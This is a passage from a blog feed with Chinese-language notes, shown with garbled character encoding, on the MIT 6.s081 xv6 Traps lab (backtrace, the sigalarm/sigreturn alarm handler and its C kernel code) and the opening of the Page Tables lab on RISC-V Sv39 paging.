8</code>ã€‚è¿™ä¸ªè¿­ä»£è¿‡ç¨‹éœ€è¦æœ‰ä¸€ä¸ªä¸­æ­¢æ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­æ˜¯å¦åˆ°è¾¾æœ€åä¸€ä¸ªæ ˆå¸§ï¼ˆæ ˆçš„é«˜åœ°å€ï¼‰ã€‚xv6 ä¸ºæ¯ä¸ªæ ˆï¼ˆç”¨æˆ·ç¨‹åºæ ˆ/å†…æ ¸æ ˆï¼‰éƒ½åˆ†é…ä¸€ä¸ª 4KB çš„é¡µï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ <code>PGROUNDUP(fp)</code> æ¥ç¡®å®šæ ˆçš„èµ·å§‹åœ°å€ã€‚</p><p><strong>æ³¨æ„ï¼ï¼ï¼</strong> å®éªŒä¹¦å†™çš„ â€You can useÂ <code>PGROUNDDOWN(fp)</code>Â (seeÂ <code>kernel/riscv.h</code>) to identify the page that a frame pointer refers toâ€œ æœ‰è¯¯å¯¼æ€§ï¼Œæ ˆç”±é«˜åœ°å€å‘ä¸‹å¢é•¿ï¼Œå–åˆ°é¡µçš„èµ·å§‹åœ°å€æ²¡æœ‰æ„ä¹‰ï¼Œä¸€å¼€å§‹è¢« hint æäº†ä¸€æ‰‹ã€‚</p><p><img src="/2025/07/08/Lab-Traps/bttest_1.png" alt="bttest_1.png"><br>ç¬¬ä¸€æ¬¡å°è¯•å‘ç°å¤šæ‰“äº†ä¸€è¡Œè¿”å›åœ°å€ï¼Œé€šè¿‡ GDB è°ƒè¯•åå‘ç°åœ¨ç¬¬ä¸‰æ¬¡å¾ªç¯ç»“æŸå <code>fp</code> æ°å¥½å˜ä¸ºäº† <code>0x3fffffa000</code> å³å†…æ ¸æ ˆçš„æ ˆåº• <code>stack_base</code>ï¼Œç”±äºå¾ªç¯æ¡ä»¶å†™é”™ï¼Œè¿›å…¥ç¬¬å››æ¬¡å¾ªç¯ï¼Œæ­¤æ—¶è¯»å– â€œraâ€œ å’Œ â€fpâ€œ éƒ½ä¸ä¼šå‡ºé—®é¢˜ï¼Œå› ä¸ºè¿˜æ˜¯åœ¨è¯»å–å†…æ ¸æ ˆä¸Šçš„æ•°æ®ã€‚ä½†åœ¨ç¬¬å››æ¬¡å¾ªç¯å <code>fp</code> æŒ‡å‘äº†äº†ä¸€ä¸ªå¾ˆä½çš„åœ°å€ <code>0x3fd0</code>ï¼Œè¿™ä¹ˆä½çš„åœ°å€å†…æ ¸æ²¡æœ‰æ˜ å°„ä»»ä½•çš„ç‰©ç†å†…å­˜æˆ–æ˜¯å…¶ä»–è®¾å¤‡ï¼Œæ‰€ä»¥åœ¨ç¬¬äº”æ¬¡å¾ªç¯çš„æ—¶å€™ä¼šå› ä¸ºè¯»å–éæ³•åœ°å€è§¦å‘ page faultã€‚</p><p>ä¿®æ”¹å¾ªç¯åˆ¤æ–­æ¡ä»¶ä¸º <code>fp &lt; stack_base</code> åæˆåŠŸã€‚æˆ‘ä»¬æŠŠ <code>backtrace()</code> åŠ åˆ° <code>panic()</code> é‡Œï¼Œè¿™æ ·æ¯æ¬¡ kernel panic æ—¶éƒ½ä¼šè¾“å‡ºå½“å‰çš„å†…æ ¸æ ˆå‡½æ•°è°ƒç”¨æƒ…å†µï¼Œå¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ° debugã€‚<br><img src="/2025/07/08/Lab-Traps/bttest_success.png" alt="bttest_success.png"></p><h1 id="alarm"><a class="markdownIt-Anchor" href="#alarm"></a> Alarm</h1><blockquote><p>In this exercise youâ€™ll add a feature to xv6 that periodically alerts a process as it uses CPU time. This might be useful for <strong>compute-bound processes</strong> that want to limit how much CPU time they chew up, or for processes that want to compute but also want to take some periodic action. More generally, <strong>youâ€™ll be implementing a primitive form of user-level interrupt/fault handlers</strong>; you could use something similar to handle page faults in the application, for example.</p></blockquote><p>è¿™ä¸ªä»»åŠ¡å®é™…ä¸Šéœ€è¦æˆ‘ä»¬å®Œæˆä¸€ä¸ªç”¨æˆ·æ€çš„æ—¶é’Ÿä¸­æ–­ handler ã€‚å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å®ç° <code>sigalarm(interval, handler)</code> ç³»ç»Ÿè°ƒç”¨æ³¨å†Œ alarmï¼Œæ¯è¿‡ <code>interval</code> ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œå†…æ ¸éƒ½ä¼šè°ƒç”¨ user-level çš„å‡½æ•° <code>handler()</code>ï¼Œé€šè¿‡ <code>sigalarm(0, 0)</code> å–æ¶ˆæ³¨å†Œã€‚</p><p><code>sigalarm</code> æœ¬è´¨æ˜¯åœ¨æ³¨å†Œæ—¶é—´é—´éš” <code>interval</code> ä¸å¯¹åº”çš„ <code>handler</code>ï¼Œè¿™ä¸ªå±äºè¿›ç¨‹ä¿¡æ¯çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠå®ƒä»¬åŠ å…¥åˆ°è¿›ç¨‹ PCB ä¸­ï¼Œå³åœ¨ <code>struct proc</code> ä¸­æ·»åŠ è¿™ä¸¤ä¸ªå­—æ®µã€‚<code>handler</code> æ˜¯ç”¨æˆ·ç©ºé—´å‡½æ•°åœ°å€ï¼Œæˆ‘æƒ³è¿‡è¦ä¸è¦ç›´æ¥ç”¨ <code>uint64</code> æ¥è¡¨ç¤ºï¼Œä½†æ˜¯ä¸ºäº†ä»£ç æ¸…æ™°æ€§å’Œå¯è¯»æ€§ï¼Œè¿˜æ˜¯é€‰æ‹©äº†å‡½æ•°æŒ‡é’ˆ <code>void (*handler)()</code>ã€‚</p><p>æ³¨å†Œäº† handler åï¼Œæˆ‘ä»¬å¯¹äºæ¥ä¸‹æ¥çš„æ¯ä¸ªæ—¶é’Ÿä¸­æ–­éƒ½éœ€è¦å¯¹ ticks è¿›è¡Œè®¡æ•°ï¼Œå½“ <code>ticks == interval</code> æ—¶éœ€è¦è°ƒç”¨ç”¨æˆ· handlerã€‚è¿™é‡Œçš„é‡ç‚¹åœ¨äºè°ƒç”¨çš„æ—¶æœºï¼ä¸€å¼€å§‹æˆ‘æ‰“ç®—ç›´æ¥åœ¨ <code>usertrap</code> é‡Œè°ƒç”¨ï¼Œè™½ç„¶å¯ä»¥é€šè¿‡ <code>walkaddr</code> æ‰¾åˆ° handler æ‰€åœ¨çš„ç‰©ç†åœ°å€ <code>handler_pa = walkaddr(p-&gt;pagetable, (uint64)p-&gt;handler)</code>ï¼Œä½†æ˜¯å½“å‰æ‰§è¡Œç¯å¢ƒè¿˜æ˜¯<strong>å†…æ ¸ç¯å¢ƒ</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨çš„æ˜¯å†…æ ¸é¡µè¡¨ï¼Œç”¨æˆ·å†…æ ¸æ ˆç­‰ï¼Œ<strong>è€Œ handler ä½œä¸ºç”¨æˆ·å‡½æ•°æœ¬åº”è¯¥åœ¨ç”¨æˆ·æ€ä¸‹æ‰§è¡Œ</strong>ï¼Œå®ƒçš„é€»è¾‘<strong>å¯èƒ½ä¼šç ´åæ‰å†…æ ¸ç¯å¢ƒå¯¼è‡´ panic</strong>ï¼ˆæ¯”å¦‚å‘ç”Ÿå†…æ ¸æ€ä¸‹è°ƒç”¨ syscall ç›´æ¥äº§ç”Ÿå¼‚å¸¸ panicï¼ï¼‰ã€‚</p><p>å› æ­¤æˆ‘ä»¬ä¸èƒ½åœ¨å†…æ ¸æ€ä¸­çš„ <code>usertrap</code> ä¸­è°ƒç”¨ï¼Œä½†è¿˜æ˜¯éœ€è¦åˆ¤æ–­æ¡ä»¶ï¼Œç„¶åè¿”å›åˆ°ç”¨æˆ·æ€ä¸‹æ‰§è¡Œã€‚å®ç°æ–¹æ³•åªèƒ½ä¿®æ”¹ <code>p-&gt;trapframe-&gt;epc</code> ä¸º handler åœ°å€ï¼Œè¿™æ ·å½“ trap è¿”å›æ—¶å°±èƒ½è·³è½¬åˆ° handler åœ¨ç”¨æˆ·æ€ä¸‹æ‰§è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c: usertrap()</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;handler != <span class="number">0</span> &amp;&amp; p-&gt;interval != <span class="number">0</span>)&#123; <span class="comment">//ï¼è¿™é‡Œæ¡ä»¶åˆ¤æ–­ä¸å¯¹</span></span><br><span class="line">      <span class="comment">// increace process&#x27;s alarm ticks</span></span><br><span class="line">      p-&gt;tick_count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;tick_count == p-&gt;interval)&#123;</span><br><span class="line">      p-&gt;trapframe-&gt;epc = (uint64)p-&gt;handler;</span><br><span class="line">    &#125;</span><br><span class="line">    yield();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/08/Lab-Traps/test0_failed.png" alt="test0_failed.png"><br>æµ‹è¯•ç»“æœè¡¨æ˜æ²¡æœ‰è°ƒç”¨ handlerï¼Œæ€€ç–‘æ˜¯ <code>sys_sigalarm</code> ä¼ å‚æ²¡æœ‰åˆå§‹åŒ–å¥½ <code>interval</code> å’Œ <code>handler</code> ã€‚</p><p>è°ƒè¯•äº†ä¸€ä¸‹å‘ç° handler çš„åœ°å€å¯ä»¥æ˜¯ 0x0ï¼Œå› æ­¤å‰é¢å†™çš„é€’å¢è®¡æ•°å™¨çš„é€»è¾‘æœ‰è¯¯ï¼Œåº”è¯¥ä¿®æ”¹ä¸º <code>||</code>ã€‚<br><img src="/2025/07/08/Lab-Traps/test0_debug.png" alt="test0_debug.png"></p><hr><p>å‰é¢æˆ‘ä»¬ä¸ºäº†èƒ½è°ƒè½¬åˆ° handler æŠŠ handler çš„åœ°å€ç›´æ¥å†™å…¥äº†<code>trapframe-&gt;epc</code>ï¼Œä½†æ²¡æœ‰è€ƒè™‘åˆ°åé¢çš„ç»“æœï¼šæ—¶é’Ÿä¸­æ–­åˆ°æ¥è§¦å‘ handler æ—¶ï¼ŒåŸå…ˆçš„ <code>epc</code> è¢«è¦†ç›–æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹è¢«æ—¶é’Ÿä¸­æ–­çš„ä½ç½®ï¼ˆæ­£å¸¸çš„æ‰§è¡Œæµï¼‰å‘¢ï¼Ÿå…¶å®é™¤äº† <code>trapframe-&gt;epc</code> ä¼šè¢«è¦†ç›–å¤–ï¼Œä¿å­˜åœ¨ trapframe ä¸­çš„å…¶ä½™æ‰€æœ‰ 32 ä¸ªé€šç”¨å¯„å­˜å™¨ä¹Ÿéƒ½å¯èƒ½ä¼šåœ¨ handler çš„æ‰§è¡Œæµä¸­è¢«ä¿®æ”¹ï¼Œä»¥åŠ trapframe ä¸­çš„ <code>kernel_*</code>ã€‚é‚£ä¹ˆè¿™æ›´åŠ è¯´æ˜æˆ‘ä»¬éœ€è¦èƒ½å¤Ÿåœ¨ handler å¤„ç†å®Œæˆåæœ‰åŠæ³•æ¢å¤è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚å®éªŒç»™æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œæ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ <code>sigreturn</code> ï¼Œå¹¶åœ¨ handler çš„æœ€åæ˜¾ç¤ºè°ƒç”¨ã€‚</p><p><strong>ç»¼åˆä¸Šé¢çš„è®¨è®ºï¼Œæˆ‘ä»¬éœ€è¦ä¿å­˜ timer expires æ—¶åˆ»è¿›ç¨‹ trapframe ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œé—®é¢˜æ—¶è¿™äº›æ•°æ®åº”è¯¥ä¿å­˜åˆ°ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Ÿ</strong></p><p>æƒ³æ³•ä¸€ï¼šæ¨åˆ°å†…æ ¸æ ˆï¼Ÿä¸å¯è¡Œ Ã— <code>usertrapret()</code> è¿”å›æ—¶ä¼šæ¸…ç©ºå†…æ ¸æ ˆ <code>p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE</code>ï¼Œè€Œä¸”ä¸èƒ½ç¡®å®š handler çš„æ‰§è¡Œé€»è¾‘æ˜¯å¦ä¼šä½¿ç”¨å†…æ ¸æ ˆ<br>æƒ³æ³•äºŒï¼šåœ¨ trapframe ä¸­å¤‡ä»½å¯„å­˜å™¨ï¼Œæ·»åŠ ä¸€éé‡å¤çš„å­—æ®µã€‚ å¥½åƒå¯è¡Œï¼Œä½†æ˜¯æœ‰ç‚¹å†—ä½™ Ã—<br>æƒ³æ³•ä¸‰ï¼šä¸ºæ¯ä¸ªè¿›ç¨‹é¢å¤–åˆ†é…ä¸€ä¸ªç”¨äºå¤‡ä»½çš„ trapframe_backup âˆš</p><p>ä¸ºäº†ä»£ç ç»“æ„çš„æ¸…æ™°æ€§ï¼Œæˆ‘é€‰æ‹©åœ¨ <code>struct proc</code> ä¸­å¢åŠ ä¸€ä¸ª <code>struct trapframe* trapframe_backup</code> å­—æ®µä¸“é—¨ç”¨äº alarm å¤‡ä»½/æ¢å¤ä¸Šä¸‹æ–‡ã€‚</p><p><strong>æ³¨æ„ï¼ï¼<code>allocproc</code> ä¸­åˆ†é…çš„ trapframe_backup ç‰©ç†é¡µè¦åœ¨ <code>freeproc</code> ä¸­é‡Šæ”¾ï¼Œä¸ç„¶ä¼šé€ æˆå†…å­˜æ³„æ¼ï¼ï¼ï¼ï¼ˆç—›è¿‡å°±çŸ¥é“ï¼‰</strong></p><blockquote><p><strong>Hint: make sure to restore <code>a0</code>.Â <code>sigreturn</code>Â is a system call, and its return value is stored in <code>a0</code>.</strong><br>è§£å†³æ–¹æ³•ï¼š<code>sigreturn</code> è¿”å› trapframe ä¸­ä¿å­˜çš„ <code>a0</code> ï¼Œè¿™æ ·å°±ä¸ä¼šä¸¢å¤± <code>a0</code></p></blockquote><blockquote><p><strong>Hint: prevent re-entrant calls to the handler----if a handler hasnâ€™t returned yet, the kernel shouldnâ€™t call it again.</strong><br>è§£å†³æ–¹æ¡ˆï¼šå†æ·»åŠ ä¸€ä¸ªå­—æ®µï¼Œç”¨äºæ ‡è¯†å½“å‰è¿›ç¨‹æ˜¯å¦åœ¨ handler æ‰§è¡Œæµä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c: usertrap()</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;interval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// increace process&#x27;s alarm ticks</span></span><br><span class="line">      p-&gt;tick_count++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(p-&gt;tick_count &gt;= p-&gt;interval &amp;&amp; p-&gt;ret == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// backup the context of current process</span></span><br><span class="line">        memmove(p-&gt;trapframe_backup, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">        p-&gt;ret = <span class="number">0</span>;</span><br><span class="line">        p-&gt;trapframe-&gt;epc = (uint64)p-&gt;handler;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  uint64 fn;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;n);</span><br><span class="line">  argaddr(<span class="number">1</span>, &amp;fn);</span><br><span class="line">  p = myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(n &lt; <span class="number">0</span>)  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  p-&gt;tick_count = <span class="number">0</span>;</span><br><span class="line">  p-&gt;interval = n;</span><br><span class="line">  p-&gt;handler  = (<span class="type">void</span>*)fn;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  p = myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the context before timer interrupt</span></span><br><span class="line">  memmove(p-&gt;trapframe, p-&gt;trapframe_backup, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// reset counters and ret sign</span></span><br><span class="line">  p-&gt;tick_count = <span class="number">0</span>;</span><br><span class="line">  p-&gt;ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the return value of sigreturn should not cover a0</span></span><br><span class="line">  <span class="keyword">return</span> p-&gt;trapframe-&gt;a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/08/Lab-Traps/test_passed.png" alt="test_passed.png"></p><p>ä¸€å¼€å§‹ usertests æ²¡æœ‰è¿‡ï¼Œåé¢å¯¹äºä¸€äº›ç»†èŠ‚åšäº†è°ƒæ•´ï¼ˆ<strong>æ„Ÿè§‰å¯èƒ½æ˜¯æˆ‘å¿˜è®°åœ¨ <code>freeproc</code> ä¸­æŠŠå¤‡ä»½ <code>trapframe_backup</code> çš„ç‰©ç†é¡µé‡Šæ”¾äº†ï¼Œå¯¼è‡´äº†å†…å­˜æ³„éœ²ã€‚ã€‚</strong> æœ¬è´¨å½©ç¬”æ˜¯è¿™æ ·çš„ï¼‰<br><img src="/2025/07/08/Lab-Traps/usertests.png" alt="usertests.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Before you start coding, read Chapter 4 of theÂ &lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2024/xv6/book-riscv-rev4.pdf&quot;&gt;xv6 b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: Page Tables</title>
    <link href="http://example.com/2025/07/05/Lab-Page%20Tables/"/>
    <id>http://example.com/2025/07/05/Lab-Page%20Tables/</id>
    <published>2025-07-05T09:18:36.952Z</published>
    <updated>2025-07-07T06:20:43.370Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Before you start coding, read Chapter 3 of theÂ <a href="https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev3.pdf">xv6 book</a>, and related files:<br><code>kernel/memlayout.h</code>, which captures the layout of memory.<br><code>kernel/vm.c</code>, which contains most virtual memory (VM) code.<br><code>kernel/kalloc.c</code>, which contains code for allocating and freeing physical memory.</p></blockquote><p>åœ¨è¿™ä¸ªå®éªŒä¸­æˆ‘ä»¬å°†ä¼šæ·±å…¥åˆ†æ xv6 æ˜¯å¦‚ä½•é€šè¿‡é¡µè¡¨å®ç°åœ°å€è™šæ‹ŸåŒ–çš„ï¼ˆpagingï¼‰ã€‚</p><p>åœ¨å¼€å§‹å®éªŒä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜æ˜¯å…ˆé€šè¯»ä¸€ä¸‹ xv6 book çš„ç¬¬ä¸‰ç« ï¼ŒRTFM ä»¥åŠ RTFSCã€‚</p><hr><h1 id="rtfmxv6-è™šæ‹Ÿåœ°å€å®ç°"><a class="markdownIt-Anchor" href="#rtfmxv6-è™šæ‹Ÿåœ°å€å®ç°"></a> RTFMï¼šxv6 è™šæ‹Ÿåœ°å€å®ç°</h1><h2 id="ç¡¬ä»¶æ”¯æŒ"><a class="markdownIt-Anchor" href="#ç¡¬ä»¶æ”¯æŒ"></a> ç¡¬ä»¶æ”¯æŒ</h2><p>æˆ‘ä»¬çŸ¥é“æ— è®º CPU æ‰§è¡Œçš„æ˜¯ user level çš„æŒ‡ä»¤è¿˜æ˜¯ kernel level çš„æŒ‡ä»¤ï¼Œå®ƒéƒ½æ˜¯å¯¹è™šæ‹Ÿåœ°å€è¿›è¡Œæ“ä½œçš„ï¼Œè¿™ä¸ªåœ°å€éœ€è¦é€šè¿‡ä¸€ä¸ªç¡¬ä»¶ï¼ˆMMUï¼‰å¯¹åº”é¡µè¡¨è¿›è¡Œåœ°å€è½¬åŒ–ï¼Œç¿»è¯‘ä¸ºå®é™…çš„ç‰©ç†é¡µ+åç§»ã€‚åŒæ—¶ï¼Œè¿™ä¸ªé¡µè¡¨çš„å®ç°ä¹Ÿæ˜¯åŸºäºç¡¬ä»¶å®ç°çš„ï¼ˆpaging hardwareï¼‰ã€‚ä½œä¸ºä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œxv6 æ¨¡æ‹Ÿäº†å¯¹è¿™äº›ç¡¬ä»¶è¿›è¡Œæ“ä½œçš„è½¯ä»¶é€»è¾‘ï¼ŒQEMU è´Ÿè´£è™šæ‹ŸåŒ–ç¡¬ä»¶ã€‚</p><p>è™šæ‹Ÿåœ°å€ç¿»è¯‘çš„è¿‡ç¨‹æŒ‰ç…§ Sv39 RISC-V æ ‡å‡†ä½¿ç”¨è™šæ‹Ÿåœ°å€ä¸­ä½ 39 ä½çš„é«˜ 27 ä½ä½œä¸ºç´¢å¼•æŸ¥æ‰¾é¡µè¡¨ä¸­çš„ç‰©ç†é¡µ (44bits)ï¼Œç„¶åç»“åˆä½ 12 ä½çš„åç§»é‡æ„æˆ 56 ä½çš„ç‰©ç†åœ°å€ã€‚è¿™ä¸ªæ ‡å‡†è¡¨æ˜é¡µè¡¨ä¸€å…±æœ‰ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>27</mn></msup></mrow><annotation encoding="application/x-tex">2^{27}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span> æ¡ <em>page table entry (PTE)</em> ï¼Œæ¯é¡µçš„å¤§å°ä¸º <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>12</mn></msup></mrow><annotation encoding="application/x-tex">2^{12}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> (4KB)ã€‚<br><img src="/2025/07/05/Lab-Page%20Tables/vir2phy.png" alt="vir2phy.png"></p><h2 id="risc-v-å¤šçº§é¡µè¡¨"><a class="markdownIt-Anchor" href="#risc-v-å¤šçº§é¡µè¡¨"></a> RISC-V å¤šçº§é¡µè¡¨</h2><p>å®é™…çš„ RISC-V CPU é‡‡ç”¨ä¸‰çº§ç”šè‡³å››çº§é¡µè¡¨è¿›è¡Œåœ°å€è½¬æ¢ï¼Œä»¥ä¸‰çº§é¡µè¡¨ä¸ºä¾‹ï¼ŒæŠŠåŸå…ˆçš„ 27bits æ‹†ä¸ºä¸‰ä¸ª 9bits ï¼ŒL2 å¯¹åº”ä¸€çº§é¡µè¡¨çš„ç´¢å¼•ï¼Œä»¥æ­¤ç±»æ¨ã€‚åŒæ ·æ˜¯ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>512</mn><mo>âˆ—</mo><mn>512</mn><mo>âˆ—</mo><mn>512</mn><mo>=</mo><msup><mn>2</mn><mn>27</mn></msup></mrow><annotation encoding="application/x-tex">512*512*512=2^{27}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span> ä¸ª PTEsï¼Œä½†åœ¨é¡µè¡¨å­˜å‚¨ä¸Šå´å¤§å¤§èŠ‚çº¦å†…å­˜ï¼Œå°½ç®¡ç†è®ºä¸Šå•çº§é¡µè¡¨éœ€è¦ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>27</mn></msup><mo>âˆ—</mo><mn>8</mn><mi mathvariant="normal">/</mi><mn>4096</mn><mo>=</mo><msup><mn>2</mn><mn>18</mn></msup><mi>p</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">2^{27}*8/4096=2^{18}pages</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mord">/</span><span class="mord">4</span><span class="mord">0</span><span class="mord">9</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span></span></span></span> çš„å†…å­˜ï¼Œä¸‰çº§é¡µè¡¨ä¹Ÿéœ€ <span 